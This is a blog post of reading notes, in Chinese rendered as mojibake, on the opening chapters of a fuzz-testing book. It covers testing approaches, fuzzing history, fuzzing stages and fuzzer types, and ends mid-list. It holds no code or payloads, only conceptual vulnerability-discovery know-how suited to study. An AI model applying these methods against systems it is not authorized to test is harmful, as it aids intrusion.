    <a href="/2021/01/13/2021-01-13-fuzz_note/" class="article-date">
  <time class="dt-published" datetime="2021-01-12T16:00:00.000Z" itemprop="datePublished">2021-01-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/13/2021-01-13-fuzz_note/">Reading notes</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>çœ‹å®Œæœ¬ä¹¦å­¦åˆ°å¾ˆå¤šä¸œè¥¿ï¼Œè®°æ­¤ç¬”è®°å’Œå¤§å®¶åˆ†äº«ï¼›è€ƒè™‘åˆ°æœ¬ä¹¦å†…å®¹åºæ‚ï¼Œå¯ä»¥å¤§è‡´åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼šå‰å…­ç« æ˜¯åŸºç¡€ï¼Œä¹‹åçš„æ˜¯å…·ä½“å¹³å°fuzzçš„å…·ä½“å®ç°æ–¹å¼å’Œæ³¨æ„äº‹é¡¹ï¼Œç¬¬ä¸‰éƒ¨åˆ†å½’ç±»ä¸ºå…¶ä»–ã€‚æœ¬æ¬¡ç¬”è®°è°ˆçš„æ˜¯å‰å…­ç« ã€‚</p>
<h3 id="ç¬¬ä¸€ç« -å®‰å…¨æ¼æ´å‘ç°æ–¹æ³•å­¦"><a href="#ç¬¬ä¸€ç« -å®‰å…¨æ¼æ´å‘ç°æ–¹æ³•å­¦" class="headerlink" title="ç¬¬ä¸€ç«  å®‰å…¨æ¼æ´å‘ç°æ–¹æ³•å­¦"></a>ç¬¬ä¸€ç«  å®‰å…¨æ¼æ´å‘ç°æ–¹æ³•å­¦</h3><blockquote>
<p>ä¸‰ç§å‘ç°æ¼æ´çš„æ–¹å¼</p>
</blockquote>
<p>ç™½ç›’æµ‹è¯•ã€é»‘ç›’æµ‹è¯•å’Œç°ç›’æµ‹è¯•æ˜¯å‘ç°å®‰å…¨æ¼æ´çš„ä¸‰ä¸ªä¸»è¦æ–¹æ³•ã€‚ç™½ç›’è¦æ±‚æµ‹è¯•è€…æœ‰è¢«æµ‹ç³»ç»Ÿçš„æ‰€æœ‰èµ„æºï¼Œé»‘ç›’åˆ™èµ°å‘å¦ä¸€ä¸ªæç«¯ï¼Œå¤§éƒ¨åˆ†æƒ…å†µå±äºâ€œç›²æµ‹â€ï¼Œç°ç›’åœ¨æœ¬ä¹¦ä¸­è®¨è®ºçš„æ–¹æ³•æ˜¯æœ‰ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œéƒ¨åˆ†åŸºç¡€æ–‡æ¡£ã€‚å…·ä½“é˜è¿°å¦‚ä¸‹ï¼š</p>
<h4 id="ç™½ç›’æµ‹è¯•"><a href="#ç™½ç›’æµ‹è¯•" class="headerlink" title="ç™½ç›’æµ‹è¯•"></a>ç™½ç›’æµ‹è¯•</h4><ul>
<li>è¿›è¡Œä»£ç è¯„å®¡ï¼ˆäººå·¥å®¡è®¡æˆ–ä¸Šè‡ªåŠ¨åŒ–ï¼‰ï¼›</li>
<li>ä¼˜ç‚¹ï¼šé«˜è¦†ç›–ï¼ˆä»ç†è®ºä¸Šæ¥è¯´èƒ½å‘ç°ä¸€åˆ‡æ¼æ´ï¼‰ï¼›</li>
<li>ç¼ºç‚¹ï¼šå¤ªå¤æ‚ä¹Ÿä¸å¤ªç°å®</li>
</ul>
<h4 id="é»‘ç›’æµ‹è¯•"><a href="#é»‘ç›’æµ‹è¯•" class="headerlink" title="é»‘ç›’æµ‹è¯•"></a>é»‘ç›’æµ‹è¯•</h4><ul>
<li>æ‰‹å·¥æµ‹è¯•æˆ–fuzzï¼ˆå¼•å‡ºfuzzï¼Œç®€å•åœ°è¯´æ˜¯æŠŠç¨‹åºéé¢„æœŸçš„æ•°æ®éƒ½è¾“å…¥ç»™è¢«æµ‹åº”ç”¨ï¼Œç›‘è§†è¿”å›çš„ç»“æœï¼‰ï¼›</li>
<li>ä¼˜ç‚¹ï¼šé«˜å¯ç”¨ï¼ˆåŸºæœ¬æ€»æ˜¯å¯ç”¨ï¼‰ã€é«˜å¯é‡ç°æ€§ï¼ˆä¾‹å¦‚å®Œæˆå¯¹æŸç§æœåŠ¡å™¨é»‘ç›’æµ‹è¯•å¯ä»¥ç”¨ç›¸åŒåŸç†ç”¨åˆ°ç±»ä¼¼çš„æœåŠ¡å™¨ä¸Šï¼‰ã€ç®€å•ï¼ˆæ— éœ€äº†è§£ç»†èŠ‚ï¼Œä½†æ˜¯æƒ³å‘ç°æœ‰è¶£çš„é—®é¢˜ä¹Ÿè¦æ·±å…¥å­¦ä¹ ï¼‰ï¼›</li>
<li>ç¼ºç‚¹ï¼šé»‘ç›’æµ‹è¯•ä¸çŸ¥ä½•æ—¶åœæ­¢ã€ä¸çŸ¥æµ‹è¯•çš„æ•ˆæœã€ä¸èªæ˜æ¯”è¾ƒç¬¨</li>
</ul>
<h4 id="ç°ç›’æµ‹è¯•"><a href="#ç°ç›’æµ‹è¯•" class="headerlink" title="ç°ç›’æµ‹è¯•"></a>ç°ç›’æµ‹è¯•</h4><ul>
<li>é»‘ç›’æµ‹è¯•+é€†å‘å·¥ç¨‹è·å¾—ç³»ç»Ÿå†…éƒ¨çŸ¥è¯†ï¼Œé€šè¿‡åæ±‡ç¼–å™¨åç¼–è¯‘å™¨ã€è°ƒè¯•å™¨å¯¹åº”ç”¨è¿›è¡Œæ·±å…¥å‰–æï¼›</li>
<li>ä¼˜ç‚¹ï¼šèƒ½æ‹¿åˆ°äºŒè¿›åˆ¶ç‰ˆæœ¬çš„è¢«æµ‹è½¯ä»¶åç°ç›’æµ‹è¯•å°±èƒ½æ´¾ä¸Šç”¨åœºã€è¦†ç›–ç‡è¾ƒé»‘ç›’æœ‰æ‰€å¢åŠ ï¼›</li>
<li>ç¼ºç‚¹ï¼šå¤æ‚æ€§ï¼Œæ²¡æœ‰äºŒè¿›åˆ¶æˆå‘˜å‚ä¸é€†å‘åˆ†æå°±å¯¸æ­¥éš¾è¡Œäº†</li>
</ul>
<p>è¯·è®°ä½ä¸‰è€…æ²¡æœ‰ä¼˜åŠ£ä¹‹åˆ†ã€‚</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210113180259-841f7e06-5586-1.png"></p>
<h3 id="ç¬¬äºŒç« -ä»€ä¹ˆæ˜¯æ¨¡ç³Šæµ‹è¯•"><a href="#ç¬¬äºŒç« -ä»€ä¹ˆæ˜¯æ¨¡ç³Šæµ‹è¯•" class="headerlink" title="ç¬¬äºŒç«  ä»€ä¹ˆæ˜¯æ¨¡ç³Šæµ‹è¯•"></a>ç¬¬äºŒç«  ä»€ä¹ˆæ˜¯æ¨¡ç³Šæµ‹è¯•</h3><blockquote>
<p>æ¨¡ç³Šæµ‹è¯•æ¦‚å¿µ</p>
</blockquote>
<p>å­¦ç•Œæœ€ä¸ä¹‹ç›¸è¿‘çš„æœ¯è¯­æ˜¯è¾¹ç•Œå€¼åˆ†æï¼Œå®ƒæ˜¯ä¸€ç§é»‘ç›’æµ‹è¯•æ–¹æ³•ï¼Œå…¶æ ¹æ®åº”ç”¨çš„åˆæ³•å’Œéæ³•è¾“å…¥åŒºé—´ï¼Œé€‰è½åœ¨åŒºé—´è¾¹ç•Œé™„è¿‘çš„å€¼åšè¾“å…¥ã€‚æ¨¡ç³Šæµ‹è¯•å·²ç»å’Œè¿™ä¸ªæ¦‚å¿µå¾ˆç›¸åƒï¼Œä½†åŒºåˆ«æ˜¯æ¨¡ç³Šæµ‹è¯•å¹¶éä»…å…³æ³¨è¾¹ç•Œå€¼ï¼Œè¿˜ä¼šå…³å¿ƒä»»ä½•èƒ½è§¦å‘æœªå®šä¹‰æˆ–ä¸å®‰å…¨è¡Œä¸ºçš„è¾“å…¥ã€‚</p>
<p>æœ¬ä¹¦ä¸­æ¨¡ç³Šæµ‹è¯•å®šä¹‰ä¸ºï¼šé€šè¿‡å‘åº”ç”¨æä¾›éé¢„æœŸè¾“å…¥å¹¶ç›‘æ§è¾“å‡ºçš„ä¸€åœºæ¥å‘ç°è½¯ä»¶å¼‚å¸¸çš„æ–¹æ³•ã€‚å…¶åˆ©ç”¨è‡ªåŠ¨åŒ–æˆ–åŠè‡ªåŠ¨åŒ–é‡å¤å‘åº”ç”¨æä¾›è¾“å…¥ã€‚åœ¨æ­¤ç»™å‡ºä¸¤ç±»ç”¨äºæ¨¡ç³Šæµ‹è¯•çš„æ¨¡ç³Šæµ‹è¯•å™¨ï¼š</p>
<ul>
<li>åŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•å™¨ï¼ˆé€šè¿‡å¯¹å·²æœ‰çš„æ•°æ®æ ·æœ¬è¿›è¡Œå˜å¼‚æ¥åˆ›å»ºæµ‹è¯•ç”¨ä¾‹ï¼‰ï¼›</li>
<li>åŸºäºç”Ÿæˆçš„æ¨¡ç³Šæµ‹è¯•å™¨ï¼ˆä¸ºè¢«æµ‹ç³»ç»Ÿç”¨çš„åè®®æˆ–æ˜¯æ–‡ä»¶æ ¼å¼å»ºæ¨¡ï¼ŒåŸºäºæ¨¡å‹ç”Ÿæˆè¾“å…¥å¹¶åˆ›å»ºæµ‹è¯•ç”¨ä¾‹ï¼‰</li>
</ul>
<p>ä½œè€…åœ¨è¿™ç”¨äº†ä¸ªå½¢è±¡çš„ä¾‹å­ï¼Œä¾‹å¦‚æˆ‘ä»¬çš„ç›®çš„æ˜¯ç ´é—¨è¿›å…¥ä¸€é—´æˆ¿å­ï¼Œç™½ç›’æµ‹è¯•å°±æ˜¯æˆ‘å¾—åˆ°äº†æˆ¿å­ä»»ä½•ä¿¡æ¯ï¼Œç”šè‡³çŸ¥é“å§å®¤é”å­çš„ç»“æ„ï¼Œä½†æˆ‘åªèƒ½çœ‹ï¼Œä¸çŸ¥é“æˆ‘çœŸæ­£è¦ç ´é—¨åå‘ç”Ÿä»€ä¹ˆï¼›é‡‡ç”¨é»‘ç›’å°±èƒ½åœ¨å¤œæ™šæ‚„æ‚„åœ¨å¤–éƒ¨æµ‹è¯•é—¨å’Œçª—ï¼Œå‘æˆ¿å­å†…çª¥æ‰¾åˆ°æœ€å¥½çªç ´å£ï¼›é€‰æ‹©æ¨¡ç³Šæµ‹è¯•çš„è¯å°±åªéœ€é€‰ä¸€ä¸ªæ­¦å™¨å¹¶ä½¿ç ´é—¨è¿›æˆ¿é—´æˆä¸ºè‡ªåŠ¨åŒ–å³å¯ã€‚</p>
<h4 id="æ¨¡ç³Šæµ‹è¯•å†å²"><a href="#æ¨¡ç³Šæµ‹è¯•å†å²" class="headerlink" title="æ¨¡ç³Šæµ‹è¯•å†å²"></a>æ¨¡ç³Šæµ‹è¯•å†å²</h4><ul>
<li>1989å¹´ï¼ŒMilleræ•™æˆç”¨äº†ä¸€ç§åŸå§‹æ¨¡ç³Šæµ‹è¯•å™¨æµ‹è¯•UNIXçš„é²æ£’æ€§ï¼Œæ€è·¯æ˜¯å‘åº”ç”¨ä¸­å‘é€éšæœºç”Ÿæˆçš„å­—ç¬¦ä¸²å’Œå­—ç¬¦ï¼›</li>
<li>1999å¹´ï¼ŒOuluå¤§å­¦åˆ›å»ºPROTOSæµ‹è¯•å¥—ä»¶ï¼šé€šè¿‡åˆ†æåè®®è§„èŒƒæ¥ç”Ÿæˆç•¸å½¢çš„æ•°æ®åŒ…ï¼›</li>
<li>2002å¹´ï¼Œå¾®è½¯å‘PROTOSæä¾›èµ„é‡‘æ”¯æŒï¼Œä»¥ç»§ç»­å‘å±•ï¼ˆå¦‚å®ç°äº†å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼‰ï¼›</li>
<li>ä¹‹ååˆæœ‰SPIKEæ¨¡ç³Šæµ‹è¯•å™¨è¢«å‘å¸ƒï¼Œè¯¥å·¥å…·å®ç°äº†åŸºäºå—çš„æ–¹æ³•ç”¨äºæµ‹è¯•åŸºäºç½‘ç»œçš„åº”ç”¨ç¨‹åºï¼Œæœ‰æè¿°å¯å˜é•¿æ•°æ®å—çš„èƒ½åŠ›ï¼Œå…¶è¿˜è‡ªå¸¦ä¸€ä¸ªåº“ï¼ŒåŒ…å«ä¸€äº›å¯èƒ½ä½¿åº”ç”¨å‘ç”Ÿæ•…éšœçš„æ•°æ®ï¼›åŒæ—¶è¯¥å·¥å…·è¿˜æœ‰ä¸€äº›é¢„å®šä¹‰çš„å‡½æ•°å¯ä»¥å¸®åŠ©ç”Ÿæˆå¸¸è§çš„åè®®æ•°æ®å’Œæ ¼å¼æ•°æ®ã€‚è¯¥å·¥å…·åœ¨å½“æ—¶å¼‚å¸¸å¼ºå¤§ï¼Œæ”¯æŒäº†å¯¹Sun RPCå’Œå¾®è½¯ RPCä¸¤ç§é€šä¿¡æŠ€æœ¯ï¼ˆå€¼å¾—ä¸€æçš„æ˜¯å‘å¸ƒSPIKEå‰ï¼Œä½œè€…Aitelè¿˜å‘å¸ƒäº†ä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•å™¨ï¼Œå®ƒé€šè¿‡ä¿®æ”¹ç¯å¢ƒå˜é‡çš„å€¼æ¥å‘ç°æ¼æ´ï¼Œå…¶é‡‡ç”¨äº†ç”¨å…±äº«åº“æ¥hookè¿”å›ç¯å¢ƒå˜é‡çš„å‡½æ•°ï¼Œè¿”å›çš„å˜é‡å€¼æ¯”ä¹‹å‰é•¿çš„å¤šæ¥è¾¾åˆ°æº¢å‡ºç›®çš„ï¼‰ï¼›</li>
<li>2004å¹´ï¼Œmanglemeå·¥å…·ç”Ÿæˆå¤§é‡ä¸æ­£å¸¸çš„HTMLæ–‡ä»¶æ¥å‘ç°Webæµè§ˆå™¨æ¼æ´ï¼Œç­‰ç­‰ï¼›</li>
<li>2004å¹´ï¼Œä¹Ÿæ˜¯æ–‡ä»¶æ¨¡ç³Šæµ‹è¯•å…´èµ·çš„ä¸€å¹´ï¼ŒåŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•å™¨å¤§è¡Œå…¶é“ï¼›</li>
<li>2005å¹´ï¼Œä¸€æ¬¾ç¡¬ä»¶æ¨¡ç³Šæµ‹è¯•å·¥å…·æŠŠæ¨¡ç³Šæµ‹è¯•æ½®æµæ¨å‘é«˜æ½®ï¼›</li>
<li>2006å¹´ï¼ŒActiveXæ¨¡ç³Šæµ‹è¯•å¼€å§‹æµè¡Œï¼›</li>
<li>ã€‚ã€‚ã€‚</li>
</ul>
<h4 id="æ¨¡ç³Šæµ‹è¯•å„ä¸ªé˜¶æ®µ"><a href="#æ¨¡ç³Šæµ‹è¯•å„ä¸ªé˜¶æ®µ" class="headerlink" title="æ¨¡ç³Šæµ‹è¯•å„ä¸ªé˜¶æ®µ"></a>æ¨¡ç³Šæµ‹è¯•å„ä¸ªé˜¶æ®µ</h4><ul>
<li>ç¡®å®šæµ‹è¯•ç›®æ ‡</li>
<li>ç¡®å®šæ½œåœ¨çš„æ¨¡ç³Šæµ‹è¯•å˜é‡</li>
<li>ç”Ÿæˆæ¨¡ç³Šæµ‹è¯•æ•°æ®</li>
<li>æ‰§è¡Œï¼ï¼ï¼</li>
<li>ç›‘è§†å¼‚å¸¸</li>
<li>åˆ¤æ–­å‘ç°çš„æ´æ˜¯å¦èƒ½åˆ©ç”¨</li>
</ul>
<h4 id="ç›®å‰å­˜åœ¨çš„ç¼ºç‚¹"><a href="#ç›®å‰å­˜åœ¨çš„ç¼ºç‚¹" class="headerlink" title="ç›®å‰å­˜åœ¨çš„ç¼ºç‚¹"></a>ç›®å‰å­˜åœ¨çš„ç¼ºç‚¹</h4><ul>
<li>æ¨¡ç³Šæµ‹è¯•å™¨é¢å¯¹ä¾‹å¦‚é€»è¾‘é—®é¢˜ï¼Œè®¾è®¡é—®é¢˜è¿™ç§å±‚é¢æ›´é«˜çš„æ—¶å€™è¡¨ç°ä¸ä½³ï¼›</li>
<li>ä¸è®¤è¯†åé—¨ï¼Œå› ä¸ºæ¨¡ç³Šæµ‹è¯•å™¨è§‰å¾—å®ƒå’Œæ­£å¸¸é€»è¾‘å·®ä¸å¤šï¼›</li>
<li>å†…å­˜è¢«ç ´ååå¦‚æœè¢«æµ‹åº”ç”¨æ©ç›–ä½æ¨¡ç³Šæµ‹è¯•å™¨å°±åˆä¸æ‡‚äº†ï¼›</li>
<li>æµ‹å‡ºæœ‰è°ƒç”¨é“¾çš„æ¼æ´æ›´åŠ å›°éš¾ï¼ˆäººå‘ç°éƒ½å›°éš¾æ›´åˆ«è¯´fuzzäº†ï¼‰</li>
</ul>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210113180329-9607fa6c-5586-1.png"></p>
<h3 id="ç¬¬ä¸‰ç« -æ¨¡ç³Šæµ‹è¯•æ–¹æ³•ä¸æ¨¡ç³Šæµ‹è¯•å™¨ç±»å‹"><a href="#ç¬¬ä¸‰ç« -æ¨¡ç³Šæµ‹è¯•æ–¹æ³•ä¸æ¨¡ç³Šæµ‹è¯•å™¨ç±»å‹" class="headerlink" title="ç¬¬ä¸‰ç«  æ¨¡ç³Šæµ‹è¯•æ–¹æ³•ä¸æ¨¡ç³Šæµ‹è¯•å™¨ç±»å‹"></a>ç¬¬ä¸‰ç«  æ¨¡ç³Šæµ‹è¯•æ–¹æ³•ä¸æ¨¡ç³Šæµ‹è¯•å™¨ç±»å‹</h3><h4 id="æ¨¡ç³Šæµ‹è¯•æ–¹æ³•"><a href="#æ¨¡ç³Šæµ‹è¯•æ–¹æ³•" class="headerlink" title="æ¨¡ç³Šæµ‹è¯•æ–¹æ³•"></a>æ¨¡ç³Šæµ‹è¯•æ–¹æ³•</h4><ul>
<li>é¢„ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ï¼ˆä½¿ç”¨æ¡†æ¶ç”Ÿæˆçš„æµ‹è¯•åˆ—è¡¨ï¼Œä½†ç”¨å®Œäº†æµ‹è¯•å°±ç»“æŸäº†ï¼‰ï¼›</li>
<li>éšæœºç”Ÿæˆè¾“å…¥ï¼ˆæ•ˆç‡ä½ï¼Œä½†ä¸€äº›å†™çš„ç‰¹åˆ«ç‰¹åˆ«ç³Ÿç³•çš„ä»£ç ä»ä¼šä¸­æ‹›ï¼Œä½†æ˜¯æ‰¾æœ‰æ•ˆçš„æµ‹è¯•å€¼å¾ˆå›°éš¾ï¼‰ï¼›</li>
<li>æ‰‹å·¥åè®®å˜å¼‚æµ‹è¯•ï¼ˆè¿™æ—¶å€™äººå°±æ˜¯æ¨¡ç³Šæµ‹è¯•å™¨ï¼Œè¾“å…¥ä¸æ­£ç¡®çš„æ•°æ®ä½¿æœåŠ¡å™¨å´©ï¼ŒSqlæ³¨å…¥æ˜¯å¾ˆå¥½çš„ä¾‹å­ï¼‰ï¼›</li>
<li>å˜å¼‚æˆ–å¼ºåˆ¶æ€§æµ‹è¯•ï¼ˆæ‰“ä¹±æœ‰æ•ˆæ ·æœ¬çš„æ•°æ®æ ¼å¼æ¥å®ç°è‡ªåŠ¨åŒ–ï¼‰ï¼›</li>
<li>è‡ªåŠ¨åè®®ç”Ÿæˆæµ‹è¯•ï¼ˆåˆ†æåº”ç”¨ï¼Œé€šè¿‡äº†è§£åè®®æˆ–æ–‡ä»¶å®šä¹‰çš„æ–‡æ³•æ¥ç”Ÿæˆæ¨¡æ¿ï¼Œè¾¾åˆ°fuzzçš„ç›®çš„ï¼Œç›¸å½“é«˜çº§ï¼‰</li>
</ul>
<h4 id="æ¨¡ç³Šæµ‹è¯•å™¨ç±»å‹"><a href="#æ¨¡ç³Šæµ‹è¯•å™¨ç±»å‹" class="headerlink" title="æ¨¡ç³Šæµ‹è¯•å™¨ç±»å‹"></a>æ¨¡ç³Šæµ‹è¯•å™¨ç±»å‹</h4><ul>
<li>æœ¬åœ°æ¨¡ç³Šå™¨(å¯¹æœ¬åœ°åº”ç”¨çš„fuzzï¼šæœ‰å‘½ä»¤è¡Œç›´æ¥fuzzï¼Œå¸¦æœ‰ç¯å¢ƒå˜é‡çš„fuzzï¼Œè¿˜æœ‰æ–‡ä»¶æ ¼å¼çš„fuzz)ï¼›</li>
<li>è¿œç¨‹æ¨¡ç³Šæµ‹è¯•å™¨ï¼ˆå¯¹åœ¨ç½‘ç»œä¸Šæ‰“å¼€ç«¯å£çš„åº”ç”¨è¿›è¡Œfuzzï¼šæœ‰ç½‘ç»œåè®®æ¨¡ç³Šæµ‹è¯•å™¨å’Œå¯¹Webåº”ç”¨çš„æ¨¡ç³Šæµ‹è¯•å™¨ï¼‰ï¼›</li>
<li>å†…å­˜æ¨¡ç³Šæµ‹è¯•å™¨ï¼šå¯¹è¿›ç¨‹æ‹å¿«ç…§ï¼Œç„¶åæ³¨å…¥æ•…éšœæ•°æ®ï¼Œæµ‹è¯•å®Œåæ¢å¤å†é‡å¤æ³¨å…¥ï¼›è¿™ç§æ–¹æ³•æœ€å¤§çš„ä¼˜ç‚¹å°±æ˜¯å¦‚æœåè®®è¿›è¡Œäº†åŠ å¯†ã€æ ¡éªŒæˆ–å‹ç¼©ç®—æ³•ï¼Œè¯¥æµ‹è¯•å™¨å¯ä»¥åœ¨ä¸Šè¿°ç®—æ³•å®Œæˆååˆ›å»ºå¿«ç…§ï¼›ç„¶è€Œç¼ºç‚¹ä¹Ÿå­˜åœ¨ï¼Œå¦‚æœ‰å¯èƒ½æ•°æ®æ ¹æœ¬æ— æ³•é€šè¿‡è¾“å…¥æºè¾“å…¥ï¼Œæµ‹è¯•è€…æƒ³å½“ç„¶çš„æ³¨å…¥è¿›æ¥å°±æ˜¾å¾—æ¯«æ— æ„ä¹‰ï¼ŒåŒæ—¶å¼‚å¸¸å¯¹åº”åˆ°è¾“å…¥æºä¹Ÿå¾ˆéš¾ç¡®å®šï¼›</li>
<li>æ¨¡ç³Šæµ‹è¯•æ¡†æ¶ï¼šå³ä¸€ä¸ªé€šç”¨çš„æ¡†æ¶ï¼ŒåŒ…å«ä¸€ä¸ªåº“ç”Ÿæˆæµ‹è¯•å­—ç¬¦ä¸²ï¼Œæ­¤å¤–è¿˜åº”åŒ…æ‹¬ç±»ä¼¼è„šæœ¬çš„è¯­è¨€ï¼Œç”¨æ¥åˆ›å»ºç‰¹å®šæ¨¡ç³Šæµ‹è¯•å™¨</li>
</ul>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210113180355-a5633396-5586-1.png"></p>
<h3 id="ç¬¬å››ç« -æ•°æ®è¡¨ç¤ºå’Œåˆ†æ"><a href="#ç¬¬å››ç« -æ•°æ®è¡¨ç¤ºå’Œåˆ†æ" class="headerlink" title="ç¬¬å››ç«  æ•°æ®è¡¨ç¤ºå’Œåˆ†æ"></a>ç¬¬å››ç«  æ•°æ®è¡¨ç¤ºå’Œåˆ†æ</h3><h4 id="ä»€ä¹ˆæ˜¯åè®®"><a href="#ä»€ä¹ˆæ˜¯åè®®" class="headerlink" title="ä»€ä¹ˆæ˜¯åè®®"></a>ä»€ä¹ˆæ˜¯åè®®</h4><p>åè®®åœ¨ç»´åŸºç™¾ç§‘ä¸­è¢«å®šä¹‰ä¸ºåœ¨ä¸¤å°è®¡ç®—æœºç«¯ç‚¹é—´æ§åˆ¶æˆ–ä½¿èƒ½è¿æ¥ï¼Œé€šä¿¡å’Œæ•°æ®ä¼ è¾“çš„çº¦å®šæˆ–æ ‡å‡†ã€‚è®¡ç®—æœºé—´çš„é€šä¿¡ä¹Ÿä¾èµ–äºæ­¤ï¼ŒåŒæ—¶åè®®ä¹Ÿæœ‰ä¸åŒè¡¨ç°å½¢å¼ï¼Œæ¯”å¦‚ä¾¿äºäººå·¥é˜…è¯»ï¼Œæœ‰çš„äººè‚‰çœ¼æ ¹æœ¬çœ‹ä¸æ‡‚ã€‚åè®®ä¸­åŒ…å«çš„å„ä¸ªéƒ¨åˆ†è¢«ç§°ä¸ºå­—æ®µã€‚</p>
<h4 id="åè®®ä¸­çš„å­—æ®µ"><a href="#åè®®ä¸­çš„å­—æ®µ" class="headerlink" title="åè®®ä¸­çš„å­—æ®µ"></a>åè®®ä¸­çš„å­—æ®µ</h4><ul>
<li>å˜é•¿å­—æ®µï¼ˆä¸ä¸ºæ¯ä¸ªæ•°æ®å…ƒç´ è®¾å®šå›ºå®šçš„é•¿åº¦å¯¹å®Œå…¨ç»“æ„åŒ–ã€å¤æ‚çš„æ•°æ®ï¼Œæœ€å¥½ç”¨å¯å˜é•¿å­—æ®µï¼Œæ¥æä¾›çµæ´»æ€§ï¼‰</li>
<li>å®šé•¿å­—æ®µï¼ˆå°†æ¯ä¸ªå­—æ®µé•¿åº¦è®¾ä¸ºå›ºå®šå€¼ï¼Œæœ€å¥½çš„ä¾‹å­ï¼šTCPã€UDPï¼‰</li>
<li>åˆ†éš”å­—æ®µï¼ˆå¦‚ç®€å•æ–‡æœ¬åè®®ç”¨å›è½¦åšåˆ†éš”ç¬¦ï¼‰</li>
</ul>
<h4 id="å¸¸ç”¨åè®®å…ƒç´ "><a href="#å¸¸ç”¨åè®®å…ƒç´ " class="headerlink" title="å¸¸ç”¨åè®®å…ƒç´ "></a>å¸¸ç”¨åè®®å…ƒç´ </h4><p>è¿™å—éœ€è¦åˆ’é‡ç‚¹ï¼Œå¯¹æ­¤è¶Šäº†è§£ï¼Œå°±æœˆèƒ½å¤Ÿåœ¨fuzzä¸­å…³æ³¨é‚£äº›æ˜“äºå¼•å‘å¼‚å¸¸åè®®ä¸­çš„éƒ¨åˆ†</p>
<ul>
<li>åå­—-å€¼å¯¹ï¼ˆå¦‚size&#x3D;12ï¼Œå¯¹å€¼è¿›è¡Œæ¨¡ç³Šå¯èƒ½ä¼šæœ‰å¥‡æ•ˆï¼‰</li>
<li>å—æ ‡è¯†ç¬¦ï¼ˆç”¨æ¥æ ‡è¯†äºŒè¿›åˆ¶æ•°æ®å—çš„æ•°æ®ç±»å‹ï¼Œæ–‡æ¡£ä¸­æ²¡æœ‰è®°å½•çš„å—æ ‡è¯†ç¬¦å¾ˆæœ‰å¯èƒ½æ¥å—é¢å¤–çš„æ•°æ®ç±»å‹ï¼Œæ„æ€å°±æ˜¯æ¡æ¼ï¼‰</li>
<li>å—å¤§å°ï¼ˆé€šè¿‡ä¿®æ”¹å—å¤§å°çš„å€¼æœ‰å¯èƒ½èƒ½å®ç°ç¼“å†²åŒºæº¢å‡ºæˆ–ä¸‹æº¢ï¼‰</li>
<li>æ ¡éªŒå’Œï¼ˆå¦‚æœè¿›è¡Œfuzzæ—¶ç ´åæ•°æ®ï¼Œå´ä¸ä¿®æ”¹æ ¡éªŒå’Œå¿…ç„¶ä¼šå½±å“è¯»å–åº”ç”¨ï¼Œæ‰€ä»¥å¿…é¡»è€ƒè™‘ï¼‰</li>
</ul>
<p>å¯è§å¯¹åè®®æœ‰ä¸€ä¸ªå¥½çš„ç†è§£ä¼šä½¿å¾—å‰æœŸçš„å·¥ä½œäº‹åŠåŠŸå€</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210113180415-b13df4c6-5586-1.png"></p>
<h3 id="ç¬¬äº”ç« -æœ‰æ•ˆæ¨¡ç³Šæµ‹è¯•çš„éœ€æ±‚"><a href="#ç¬¬äº”ç« -æœ‰æ•ˆæ¨¡ç³Šæµ‹è¯•çš„éœ€æ±‚" class="headerlink" title="ç¬¬äº”ç«  æœ‰æ•ˆæ¨¡ç³Šæµ‹è¯•çš„éœ€æ±‚"></a>ç¬¬äº”ç«  æœ‰æ•ˆæ¨¡ç³Šæµ‹è¯•çš„éœ€æ±‚</h3><h4 id="å‡ ä¸ªéœ€æ±‚å¦‚ä¸‹ï¼š"><a href="#å‡ ä¸ªéœ€æ±‚å¦‚ä¸‹ï¼š" class="headerlink" title="å‡ ä¸ªéœ€æ±‚å¦‚ä¸‹ï¼š"></a>å‡ ä¸ªéœ€æ±‚å¦‚ä¸‹ï¼š</h4><ul>
<li>å¯é‡ç°æ€§ï¼šåœ¨æ¯æ¬¡è¿è¡Œæ—¶çš„è¢«æµ‹åº”ç”¨è¡Œä¸ºåº”æ¯«æ— äºŒè‡´ï¼Œè®¡ç®—æœºæ²¡æœ‰ç»å¯¹çš„éšæœºï¼›</li>
<li>æ–‡æ¡£ï¼šè™½ç„¶ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†å°½å¯èƒ½å¤šçš„ä¿¡æ¯æ‰“åŒ…æˆæ¸…æ™°å‡†ç¡®çš„å½¢å¼ç»å¯¹æœ‰åˆ©äºåˆ†æå’Œå¤ç°ï¼›</li>
<li>å¯é‡ç”¨ï¼šç¨‹åºå‘˜ä¸å¯èƒ½æ¯fuzzä¸€æ¬¡å°±é‡å†™ä¸€ä¸ªå·¥å…·ï¼Œå¤ç”¨ç»„ä»¶æ˜¯ä¸ªå¥½ä¸»æ„ï¼›</li>
